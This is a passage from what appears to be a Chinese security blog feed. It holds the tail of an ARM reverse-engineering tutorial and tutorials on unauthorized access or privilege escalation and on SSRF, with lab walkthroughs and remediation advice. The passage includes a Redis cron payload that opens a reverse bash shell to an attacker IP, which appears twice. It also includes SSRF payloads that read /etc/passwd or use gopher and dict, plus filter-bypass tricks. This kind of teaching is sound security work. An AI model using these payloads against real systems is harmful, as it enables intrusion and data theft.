}}</code></pre><p>在if判断中，判断体在汇编中和原代码是相反的，意思是var_8 &gt; 9原文应该是var_8 &lt;=9 。printf也由puts来改变输出，puts输出会自动添加换行符，也就不在需要原文中的\n。</p><pre><code>void if1(int var_8){    if(var_8 &lt;= 9){        puts(&quot;the number less than 10&quot;);    }else{        puts(&quot;the number greater than or equal to 10&quot;);    }}</code></pre><h4 id="6-if2函数"><a href="#6-if2函数" class="headerlink" title="6. if2函数"></a>6. if2函数</h4><p>多判断结构体，也就是if-else-if</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562125307657.png" alt="1562125307657"></p><p>其中可以看到有多个LDR计算赋值指令，此处的LDR和MOV类似，只是有些时候MOV不适合使用，所以用LDR来赋值计算。</p><pre><code>LDR     R3, =(aHeIsABoy - 0x5D0)</code></pre><p>代表意思就是，aHeIsABoy的地址值减去0x5D0，赋值给R3。仔细看一下就可以明白，其中的参数都是原字符串。LDR就是aHeIsABoy减去0x5D0，此处是07EC减去0x5D0，为021C。而PC，程序计数器，指的是BL的地址值。详细参考：<a href="https://www.cnblogs.com/ichunqiu/p/9056630.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9056630.html</a></p><p>也就是说，执行到ADD的时候，MOV在译码阶段，BL在取址阶段。PC寄存器总是指向随后的第三条指令。</p><p>用BL的地址值加上R3，05D0加上021C为7EC，也就是aHeIsABoy的地址值，当然IDA已经识别出来并注释到其后。再把字符串由puts输出。</p><pre><code>LDR     R3, =(aHeIsABoy - 0x5D0)     //000007EC aHeIsABoy       DCB &quot;he is a boy&quot;,0ADD     R3, PC, R3      ; &quot;he is a boy&quot;MOV     R0, R3          ; sBL      putsB       loc_628</code></pre><p>按照汇编意思，C代码如下：</p><pre><code>void if2(int var_8){    if(var_8 &gt; 15){        if(var_8 &gt; 29){            if(var_8 &gt; 44){                puts(&quot;he is an old man&quot;);            }            else{                puts(&quot;he is a strong man&quot;);            }        }        else{            puts(&quot;he is a young man&quot;);        }    }    else{        puts(&quot;he is a boy&quot;);    }}</code></pre><p>由于汇编对判断的形式，用else if的形式可以这么写</p><pre><code>void if2(int var_8){    if(var_8 &lt;= 15){        puts(&quot;he is a boy&quot;);    }    else if(var_8 &lt;= 29){        puts(&quot;he is a young man&quot;);    }    else if(var_8 &lt;= 44){        puts(&quot;he is a strong man&quot;);    }    else{        puts(&quot;he is an old man&quot;);    }}</code></pre><p>看完以上的汇编分析后，可以得到循环体的特点，循环体一般为以下：</p><pre><code>....    //汇编代码B loc_xxx....CMP r1, r2BXX loc_xxx....BX LR</code></pre><p>判断形式一般为以下：</p><pre><code>    ....    CMP R1, R2    BXX loc_xxx    ....loc_xxx    ....    B   loc_zzzloc_zzz    ....</code></pre><p>当然，以上CMP后并不一定会跟随B指令，也会由其他条件执行指令，例如：</p><pre><code>CMP R2, R3ADDEQ R2, R3, #1</code></pre><p>其中寄存器存值，仍然是需要注意点，不小心会看错赋值，如下：</p><pre><code>LDR     R3, [R11,#var_8]LDR     R2, [R11,#var_C] ADD     R3, R2, R3      </code></pre><p>在执行一些类似ADD的指令操作后，其中的R3已不在代表var_8，其中的结果跟ADD后所获取到的R3赋值有关，这种情况可以看成：</p><pre><code>a = 1;b = 2;a = a + b;  //3</code></pre><p>所以，其中a的值已不在是1，同样如上中，R3也为此，在初期可能在不能连续查看汇编代码的情况下，会犯这种失误。</p><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><p>main函数中的赋值和返回值寄存器对应之前函数中的返回和赋值，如MOV R0, #5。在for1中，R0赋值给var_10。</p><p>同时返回值在R0中。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562137477746.png" alt="1562137477746"></p><p>下部汇编类似，就不在一步步看啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;代码编译&quot;&gt;&lt;a href=&quot;#代码编译&quot; class=&quot;headerlink&quot; title=&quot;代码编译&quot;&gt;&lt;/a&gt;代码编译&lt;/h4&gt;&lt;p&gt;使用的代码为非虫的Android软件安全权威指南，app6.c&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#i
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>越权/未授权访问</title>
    <link href="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>/2019/06/越权-未授权访问/</id>
    <published>2019-06-18T03:27:13.000Z</published>
    <updated>2019-06-18T07:00:48.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01、漏洞简介"><a href="#0x01、漏洞简介" class="headerlink" title="0x01、漏洞简介"></a>0x01、漏洞简介</h2><p>未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。</p><p>何为越权漏洞，通俗的理解为用户可以操作超出自己管理权限范围的功能，从而进行非一般用户可以操作的行为。越权一般可以分为：垂直越权，水平越权。而在非用户登陆模式下，任意用户访问特定地址或链接均可以访问到需要用户身份后才可以访问到的功能。越权也可以看为安全配置不当导致的未授权访问。</p><h2 id="0x02、漏洞原理"><a href="#0x02、漏洞原理" class="headerlink" title="0x02、漏洞原理"></a>0x02、漏洞原理</h2><p>未授权访问是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户，可以访问到内部敏感信息，导致的信息泄露，以及系统功能的执行。越权漏洞的产生原因是未对访问功能做权限的效对，或者限制不全，导致对用户的限制只局限于某一个功能和操作上。</p><h2 id="0x03、漏洞危害"><a href="#0x03、漏洞危害" class="headerlink" title="0x03、漏洞危害"></a>0x03、漏洞危害</h2><p>未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。而越权可以分为水平越权和垂直越权。垂直越权漏洞会导致低权限用户用来执行高权限用户的功能，获取高权限用户的账号信息，执行高权限用户的操作功能。水平越权会导致同一层级间的用户可以互相访问到对方的敏感信息，如保存的地址、手机号、订单记录。同时还可能会以其他平级权限用户的身份来执行某行功能，如购买，删除，添加，修改等。</p><h2 id="0x04、漏洞测试方法"><a href="#0x04、漏洞测试方法" class="headerlink" title="0x04、漏洞测试方法"></a>0x04、漏洞测试方法</h2><h3 id="0x04-1、常见的未授权服务"><a href="#0x04-1、常见的未授权服务" class="headerlink" title="0x04-1、常见的未授权服务"></a>0x04-1、常见的未授权服务</h3><h4 id="0x04-1-1、redis未授权访问"><a href="#0x04-1-1、redis未授权访问" class="headerlink" title="0x04-1-1、redis未授权访问"></a>0x04-1-1、redis未授权访问</h4><p>此问题在互联网上曾经多数存在，redis默认开放6379端口，且对外开放。可以通过此端口来执行命令写入文件来反弹shell。</p><pre><code>root@kali:~# redis-cli -h 192.168.63.130192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;OK192.168.63.130:6379&gt; config set dir /var/spool/cron/OK192.168.63.130:6379&gt; config set dbfilename rootOK192.168.63.130:6379&gt; saveOK</code></pre><h4 id="0x04-1-2、Jenkins未授权访问"><a href="#0x04-1-2、Jenkins未授权访问" class="headerlink" title="0x04-1-2、Jenkins未授权访问"></a>0x04-1-2、Jenkins未授权访问</h4><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p><pre><code>http://www.secpulse.com:8080/managehttp://www.secpulse.com:8080/script</code></pre><p>选择脚本命令行可以执行一些系统命令。</p><h4 id="0x04-1-3、MongoDB未授权访问"><a href="#0x04-1-3、MongoDB未授权访问" class="headerlink" title="0x04-1-3、MongoDB未授权访问"></a>0x04-1-3、MongoDB未授权访问</h4><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p><p>默认开启在27017端口，新版早就默认绑定在本地，之前的老版本仍有一些在互联网上开放在跑的端口。</p><h4 id="0x04-1-4、Memcache未授权访问"><a href="#0x04-1-4、Memcache未授权访问" class="headerlink" title="0x04-1-4、Memcache未授权访问"></a>0x04-1-4、Memcache未授权访问</h4><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p><p>默认开启在11211端口，可以使用端口连接工具或者命令，nc等，连接成功则存在。</p><p>关于未授权访问的可以查看：<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61101.html</a></p><h3 id="0x04-2、基于用户ID的越权"><a href="#0x04-2、基于用户ID的越权" class="headerlink" title="0x04-2、基于用户ID的越权"></a>0x04-2、基于用户ID的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user1/userinfo.php?user_id=user1https://www.xxx.com/user1/userinfo.php?user_id=10001</code></pre><p>我们登陆某个系统后，看到某些功能上获取信息的方式类似于上链接时，可以初步判断获取信息的方式为根据user_id来获对应的用户信息，如果参数为用户名，我们可以手机用户名字典来枚举信息，根据返回值判断是否存在问题。当然如果枚举较大，系统用户数量又不是很多的情况下，可以尝试注册新用户，利用新用户的用户名来测试是否可以获取到用户信息。</p><p>如果参数为一个固定的数字串时，遍历数字串即可，这种情况下是系统对每个注册用户进行了一个用户id的排序，在众多的开源CMS上都有使用，当然这个字符串也有可能是随机，如果是随机的，量不大的情况下可以采用遍历的形式获取，量较大可以利用burp的随机数爆破，或者同样自己注册账户来测试。</p><h3 id="0x04-3、基于功能对象ID的越权"><a href="#0x04-3、基于功能对象ID的越权" class="headerlink" title="0x04-3、基于功能对象ID的越权"></a>0x04-3、基于功能对象ID的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user1/userticket.php?user_order=100001https://www.xxx.com/user1/userticket.php?user_order=49ba59ab</code></pre><p>此问题大量存在于用户订单、购买、查询等功能的商家CMS上，例如以上地址，如果user_order是订单编号，那么我们可以尝试遍历订单地址来查询是否存在越权。如果编号并不是单纯的订单数字串，而是类似如上的编码字符串，相信自己的运气的话可以尝试某些编码的情况，例如BASE64、MD5。猜测不到，或者不能明显的看出来是如果做的处理，注册新账号重新下单，会是简单方便的选择。</p><h3 id="0x04-4、基于上传文件对象ID的越权"><a href="#0x04-4、基于上传文件对象ID的越权" class="headerlink" title="0x04-4、基于上传文件对象ID的越权"></a>0x04-4、基于上传文件对象ID的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user1/userfile.php?fileid=10001https://www.ccc.com/user1/userfile.php?fileid=user1_name.jpg</code></pre><p>这种上传文件后，可以越权查看其他用户的上传文件也是经常发现类似的问题。假设，系统要求我们上传个人的身份证，实名认证信息、购买的发票订单等。如果上传后看到类似如上地址，可以猜测此上传文件可以遍历获取，同过查询fileid来查看其他用户的上传信息。如果上传后文件名如第二种，可能此文件是系统经过重命名的，重命名的方式一般采用当前上传的时间戳或者当前上传的日期加随机字段，这种情况下枚举较为困难，但仍然可以采用注册新用户的方式来查看是否存在越权。顺便一问，如果是<a href="http://www.ccc.com获取信息的方式，还可能会有什么问题呢？" target="_blank" rel="noopener">www.ccc.com获取信息的方式，还可能会有什么问题呢？</a></p><h3 id="0x04-5、基于未授权访问的越权"><a href="#0x04-5、基于未授权访问的越权" class="headerlink" title="0x04-5、基于未授权访问的越权"></a>0x04-5、基于未授权访问的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user1/user.php?user=user1@user.com</code></pre><p>在一些系统上登陆用户后，可以看到类似如上的地址链接，可能你会觉得这个跟问题1类似，但是也有可能多一张问题情况，在非登陆的情况下仍然可以访问到详细信息。如果可以，则证明后端对身份的效验只是基于参数user，并没有效验用户的session是否已登陆。此问题曾发现于一个系统后端支付订单复核的功能中，问题可想而知。</p><h3 id="0x04-6、基于功能地址的越权"><a href="#0x04-6、基于功能地址的越权" class="headerlink" title="0x04-6、基于功能地址的越权"></a>0x04-6、基于功能地址的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user/getuserinfo.php</code></pre><p>如上地址，正常情况下，只访问此后台地址时，一般会跳转到登陆地址，或者登陆后用来查看某个具体的功能，获取数据的情况根据访问的链接地址来，理论上此功能并不存在越权可能，因为没有我们可以修改的参数。但是对权限及功能的限制可能只局限于用户菜单的限制，根据常用链接，可以猜测是否存在以下地址：</p><pre><code>/getuserorder.php/adduser.php/deluser.php/getalluser.php/todetailpage.php/ordercreate.php......</code></pre><p>因为在绝大部分系统中，开发为了方便区别功能和页面，通常会利用对应的英文来命名文件，但这些文件并不是任意用户都可以访问到的，所以可以猜测访问地址是否英文的拼接来猜测路径。对于此问题的快捷测试是获取一个高权限账号，当然对于未授权测试来说，很难实现。</p><h3 id="0x04-7、基于接口身份的越权"><a href="#0x04-7、基于接口身份的越权" class="headerlink" title="0x04-7、基于接口身份的越权"></a>0x04-7、基于接口身份的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user/userinfo.phppost: {&#39;userid&#39;:&#39;10001&#39;,&#39;username&#39;:&#39;name&#39;,&#39;userage&#39;:&#39;18&#39;,&#39;usermobile&#39;:&#39;18080808888&#39;}</code></pre><p>例如如上接口，修改用户信息，当我们点击某个系统的修改自身资料时，会发送一个类似的json数据包，其中userid对应我们自己的用户id，修改后，可以修改对应id的用户资料。修改方式类似问题1。区别在于一个页面可见，一个页面不直观可见，一个查询，一个修改。需要配合其他越权查询漏洞，或者账号来识别是否修改成功。</p><h2 id="0x05、漏洞靶场"><a href="#0x05、漏洞靶场" class="headerlink" title="0x05、漏洞靶场"></a>0x05、漏洞靶场</h2><p>漏洞环境：phpstudy，webug4.0</p><p>靶场介绍：国产靶场，漏洞齐全，演示也相当完善。其中还分为初，中，高。虽然高好像没东西，但仍然是一个不错的靶场环境。</p><p>漏洞演示：演示为靶场的22号漏洞，越权修改密码</p><p>靶场安装：<a href="https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。" target="_blank" rel="noopener">https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。</a></p><p>把sql目录中的文件安装到数据库，新建三个按照文件名的数据库，导入数据文件，修改data目录下的dbconfig和dbconn文件，修改为自己的数据库账号密码和数据库名。修改完成后建议把网站目录修改为webug的目录下。直接访问本地地址即可。</p><p><img src="\2019\06\越权-未授权访问\1560762175585.png" alt="1560762175585"></p><p>另外需要修改/control/auth_cross/cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径：</p><pre><code>header(&quot;Location:/pt_env/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;)修改为：header(&quot;Location:/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;)</code></pre><p>点击第一个越权修改密码后进入如下页面：</p><p><img src="\2019\06\越权-未授权访问\1560762425340.png" alt="1560762425340"></p><p>此处我打开了数据库来对应查看修改密码的情况，打开webug数据库下的user_test表，可以看到其中有两个用户如下：</p><p><img src="\2019\06\越权-未授权访问\1560762734951.png" alt="1560762734951"></p><p>此处利用aaaaa用户修改admin用户密码，利用aaaaa账户登陆后，看到如下界面</p><p><img src="\2019\06\越权-未授权访问\1560762941147.png" alt="1560762941147"></p><p>此处，我们可以先正常走一遍逻辑来查看其中的数据包情况，把aaaaa的密码修改为aaaaa，弹窗OK。然后查看抓取到的数据包。</p><p><img src="\2019\06\越权-未授权访问\1560763134387.png" alt="1560763134387"></p><p>其中有旧密码和新密码两个参数，理论上如果效验了旧密码和账号的一致性，就算链接中的id可以修改越权也无法修改密码，会提示旧密码不正确，但此处并没有效验旧密码和账号的一致性，导致修改链接中的2为1，post参数不变，或者任意旧密码值，便可以修改admin的密码。</p><p><img src="\2019\06\越权-未授权访问\1560763314987.png" alt="1560763314987"></p><p>查看数据库修改是否成功：</p><p><img src="\2019\06\越权-未授权访问\1560763331000.png" alt="1560763331000"></p><p>此处的问题存在两点，一是修改的用户身份由链接中的ID来决定，二是没有对旧密码和账户进行身份验证。</p><h2 id="0x06、测试工具"><a href="#0x06、测试工具" class="headerlink" title="0x06、测试工具"></a>0x06、测试工具</h2><p>对于越权类的安全问题，并没有自动化测试工具来发现和识别，至少现在没有发现哪里有完善的越权检测工具和扫描器。</p><p>此处介绍一款burp的越权插件，辅助检测越权漏洞，但是只能检测基于功能的越权，并不能自动的检测需要修改参数来判断越权形式的漏洞。</p><p>在burp的Extender选项中选择BApp Store选项卡，找到Authz插件，点击install。安装完成后选项卡中会出现一个Authz的新选项卡，界面如下：</p><p><img src="\2019\06\越权-未授权访问\1560763815165.png" alt="1560763815165"></p><p>此处需要两个用户身份，假设为A用户和B用户，登陆A用户的账号，获取Cookie到new header中，使用B账号抓包获取信息。到proxy中选择需要测试的功能地址，右键到Send requests to Authz。</p><p><img src="\2019\06\越权-未授权访问\1560763954202.png" alt="1560763954202"></p><p>获取够需要测试的功能后，到Authz界面点击run即可运行，此处没有设置cookie，那么将按照未授权访问来测试。</p><p><img src="\2019\06\越权-未授权访问\1560764399936.png" alt="1560764399936"></p><p>其中，会在请求中替换我们输入的cookie值，如图显示，源请求的字节长度，请求的字节长度，源请求的响应码，请求的响应码，通过对响应的差别来查看是否存在越权漏洞。</p><p>能达到此检测目的的还有一款插件AuthMatrix，也同样可以检测越权，功能强劲，使用较Authz复杂，对于高要求，多用户，需要对请求中的token等进行选择替换的，可以使用此插件。</p><p>介绍地址：<a href="https://github.com/portswigger/auth-matrix" target="_blank" rel="noopener">https://github.com/portswigger/auth-matrix</a></p><h2 id="0x07、CMS演示"><a href="#0x07、CMS演示" class="headerlink" title="0x07、CMS演示"></a>0x07、CMS演示</h2><h3 id="0x07-1、前台任意修改其他用户信息"><a href="#0x07-1、前台任意修改其他用户信息" class="headerlink" title="0x07-1、前台任意修改其他用户信息"></a>0x07-1、前台任意修改其他用户信息</h3><p>漏洞环境：phpstudy，phpcms9.5.9</p><p>漏洞介绍：phpcms设计缺陷导致前台用户可以任意修改其他用户密码</p><p>漏洞下载：<a href="http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip" target="_blank" rel="noopener">http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip</a></p><p>解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：<a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256" target="_blank" rel="noopener">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256</a></p><p><img src="\2019\06\越权-未授权访问\1560820634816.png" alt="1560820634816"></p><p>在用户模块中添加如下信息，新增两个测试用户，类似如下，需要其中一个可以接收邮件。</p><p><img src="\2019\06\越权-未授权访问\1560820798272.png" alt="1560820798272"></p><p>在站点首页点击登陆处，如果跳转到404安装页面，可能是你没有删除install安装目录，删除访问index.php即可。选择忘记密码-&gt;用户名找回密码</p><p><img src="\2019\06\越权-未授权访问\1560824925363.png" alt="1560824925363"></p><p>点击获取邮箱效验码</p><p><img src="\2019\06\越权-未授权访问\1560824994228.png" alt="1560824994228"></p><p>返回上一步输入想修改的用户，如下test2</p><p><img src="\2019\06\越权-未授权访问\1560825360733.png" alt="1560825360733"></p><p>输入之前的邮箱验证码提交</p><p><img src="\2019\06\越权-未授权访问\1560825402669.png" alt="1560825402669"></p><p>点击后显示密码修改成功为以下：</p><p><img src="\2019\06\越权-未授权访问\1560825420971.png" alt="1560825420971"></p><p>尝试使用新密码登陆成功：</p><p><img src="\2019\06\越权-未授权访问\1560825511643.png" alt="1560825511643"></p><p>漏洞修复：此问题出现原因在于验证码没有跟账号做绑定，验证时只做了验证码是否有效的判断。对于此类问题，频繁出现在手机号验证码，邮箱验证码处，在最后执行修改时需要一同验证，验证码和手机或者邮箱的对应关系。</p><h3 id="0x07-2、redis未授权访问"><a href="#0x07-2、redis未授权访问" class="headerlink" title="0x07-2、redis未授权访问"></a>0x07-2、redis未授权访问</h3><p>漏洞环境：Ubuntu，reids 3.2.0</p><p>漏洞介绍：Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以写入文件来反弹shell</p><p>安装如下：</p><pre><code>wget http://download.redis.io/releases/redis-3.2.0.tar.gztar xzf redis-3.2.0.tar.gzcd redis-3.2.0make</code></pre><p>修改配置文件</p><pre><code>vi redis.confbind 127.0.0.1 加上#protected-mode yes  改为no</code></pre><p>在配置文件目录下启动</p><pre><code>./src/redis-server redis.conf</code></pre><p>启动后显示如下：</p><p><img src="\2019\06\越权-未授权访问\1560837844041.png" alt="1560837844041"></p><p>通过reids命令可以查看基本信息</p><p><img src="\2019\06\越权-未授权访问\1560837899368.png" alt="1560837899368"></p><p>尝试反弹shell到指定地址</p><pre><code>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.30.79/2333 0&gt;&amp;1\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave</code></pre><p>或者采用gopher协议，直接利用curl一条命令执行</p><p><img src="\2019\06\越权-未授权访问\1560840948082.png" alt="1560840948082"></p><h2 id="0x08、漏洞修复"><a href="#0x08、漏洞修复" class="headerlink" title="0x08、漏洞修复"></a>0x08、漏洞修复</h2><p>1、验证需要从前端获取的参数，比如用户ID和角色权限名，对于需要根据前台请求来返回数据的参数进行权限效验。</p><p>2、对于固定返回信息可以使用特定链接地址返回，同时采用不可预测地址，如：getuserinfo_snhx.php</p><p>3、对于需要修改、新增等功能进行判断，根据当前seesion判断用户，参数中只传输修改的用户信息。</p><p>4、区分用户和管理员时，不采用某些相同的参数来区别。如dede区分管理和用户都是采用ID值，容易产生问题。</p><p>5、对于查询类越权需要对每一次请求的参数做当前用户身份效验，避免水平越权。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01、漏洞简介&quot;&gt;&lt;a href=&quot;#0x01、漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01、漏洞简介&quot;&gt;&lt;/a&gt;0x01、漏洞简介&lt;/h2&gt;&lt;p&gt;未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="/2019/06/SSRF/"/>
    <id>/2019/06/SSRF/</id>
    <published>2019-06-14T07:46:34.000Z</published>
    <updated>2019-06-14T07:58:43.364Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01、漏洞简介"><a href="#0x01、漏洞简介" class="headerlink" title="0x01、漏洞简介"></a>0x01、漏洞简介</h3><p>​    SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><h3 id="0x02、漏洞原理"><a href="#0x02、漏洞原理" class="headerlink" title="0x02、漏洞原理"></a>0x02、漏洞原理</h3><p>​    通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。</p><h3 id="0x03、漏洞危害"><a href="#0x03、漏洞危害" class="headerlink" title="0x03、漏洞危害"></a>0x03、漏洞危害</h3><ol><li>扫描内网开放服务</li><li>向内部任意主机的任意端口发送payload来攻击内网服务</li><li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li><li>攻击内网的web应用，例如直接SQL注入、XSS攻击等</li><li>利用file、gopher、dict协议读取本地文件、执行命令等</li></ol><h3 id="0x04、检测与绕过"><a href="#0x04、检测与绕过" class="headerlink" title="0x04、检测与绕过"></a>0x04、检测与绕过</h3><h4 id="0x04-1、漏洞检测"><a href="#0x04-1、漏洞检测" class="headerlink" title="0x04-1、漏洞检测"></a>0x04-1、漏洞检测</h4><p>假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下：</p><pre><code>http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</code></pre><p>那么网站请求的大概步骤应该是类似以下：</p><p>用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求的数据加载到前台显示。</p><p>这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为：</p><pre><code>http://www.xxx.com/image.php?image=http://127.0.0.1:22</code></pre><p>如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如</p><pre><code>http://www.xxx.com/image.php?image=file:///etc/passwdhttp://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)......</code></pre><p>对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中：</p><pre><code>php:http、https、file、gopher、phar、dict、ftp、ssh、telnet...java:http、https、file、ftp、jar、netdoc、mailto...</code></pre><p>判断漏洞是否存在的重要前提是，请求的服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。</p><pre><code>http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</code></pre><p>链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。</p><h4 id="0x04-2、漏洞出现点"><a href="#0x04-2、漏洞出现点" class="headerlink" title="0x04-2、漏洞出现点"></a>0x04-2、漏洞出现点</h4><ol><li>分享：通过url 地址分享文章，例如如下地址：</li></ol><p><a href="http://share.xxx.com/index.php?url=http://127.0.0.1" target="_blank" rel="noopener">http://share.xxx.com/index.php?url=http://127.0.0.1</a></p><p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p><ol start="2"><li>图片加载与下载：通过URL地址加载或下载图片</li></ol><p><a href="http://image.xxx.com/image.php?image=http://127.0.0.1" target="_blank" rel="noopener">http://image.xxx.com/image.php?image=http://127.0.0.1</a></p><p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p><ol start="3"><li>图片、文章收藏功能</li></ol><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de" target="_blank" rel="noopener">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p><ol start="4"><li>利用参数中的关键字来查找</li></ol><p>例如以下的关键字：</p><pre><code>sharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain...</code></pre><h4 id="0x04-3、漏洞绕过"><a href="#0x04-3、漏洞绕过" class="headerlink" title="0x04-3、漏洞绕过"></a>0x04-3、漏洞绕过</h4><p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p><p>1、限制为<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 域名时：<br>可以尝试采用http基本身份认证的方式绕过，<a href="http://www.xxx.com@www.xxc.com。" target="_blank" rel="noopener">http://www.xxx.com@www.xxc.com。</a><br>在对@解析域名中，不同的处理函数存在处理差异，例如：<br><a href="http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。" target="_blank" rel="noopener">http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</a><br>2、限制请求IP不为内网地址：<br>采用短网址绕过，比如百度短地址<a href="https://dwz.cn/。" target="_blank" rel="noopener">https://dwz.cn/。</a><br>采用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1<br>采用进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433</p><p><img src="\2019\06\SSRF\1560153991783.png" alt="1560153991783"></p><p>3、限制请求只为http协议：</p><p>采用302跳转，百度短地址，或者使用<a href="https://tinyurl.com生成302跳转地址。使用如下：" target="_blank" rel="noopener">https://tinyurl.com生成302跳转地址。使用如下：</a></p><p><img src="\2019\06\SSRF\1560154250368.png" alt="1560154250368"></p><p>4、其他绕过形式可以查看：<a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a></p><h3 id="0x05、测试方法"><a href="#0x05、测试方法" class="headerlink" title="0x05、测试方法"></a>0x05、测试方法</h3><p>漏洞环境：PHP脚本、Windows</p><p>利用工具：bash、nc</p><p>首先采用如下脚本创建一个PHP的服务端</p><pre><code>&lt;?PHP$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 